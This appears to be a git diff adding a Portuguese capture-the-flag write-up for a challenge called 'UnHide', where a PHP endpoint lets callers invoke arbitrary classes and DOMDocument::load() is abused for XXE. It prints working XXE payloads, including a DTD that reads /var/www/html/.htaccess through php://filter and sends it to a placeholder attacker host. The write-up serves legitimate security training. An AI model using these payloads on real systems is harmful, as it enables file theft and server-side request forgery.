@@ -80,9 +80,48 @@
 
 ## UnHide (300)
 ### Descrição
-
-### Arquivos anexados
-
-### Flag
+Aplicação PHP com endpoint que permite utilização Arbitrária de Classes e Funções.
 
 ### Solução detalhada
+
+Primeiramente, ao acessar unhide.app é possível observar que um código php está sendo executado ao realizar POST requests na pagina.
+
+<img src="../images/Pasted image 20230822154123.png">
+
+O código PHP é vulnerável na medida em que permite que um atacante malicioso chame alguma classe com função nociva e cause danos e / ou exfiltre dados da aplicação.
+
+Dessa forma, esses dados estão sendo acessados via json, analise o seguinte request
+
+
+<img src="../images/Pasted image 20230822154210.png">
+
+Na imagem é utilizado a classe DOMDocument, por meio dela é possível fazer chamadas com a função load() que renderiza xml ao passar uma url como argumento.
+
+Nesse contexto, torna-se evidente a possibilidade de exploração de XXE para SSRF ou Local File read.
+
+Para explorar, o conteudo de xml.xml é
+
+```xml
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http://iphere:8000/xpl.dtd"> %ext;
+%ext;
+]>
+<r></r>
+```
+
+E o conteudo de xpl.dtd é
+
+```xml
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/.htaccess">
+<!ENTITY % payload "<!ENTITY &#37; xpl SYSTEM 'http://iphere:8000/?leak=%data;'">
+%payload;
+%xpl;
+```
+
+O qual usa o php para ler o arquivo `/var/www/html/.htaccess` , que contém a flag.
+
+
+<img src="../images/Pasted image 20230822154617.png">
+
+<img src="../images/Pasted image 20230822154625.png">
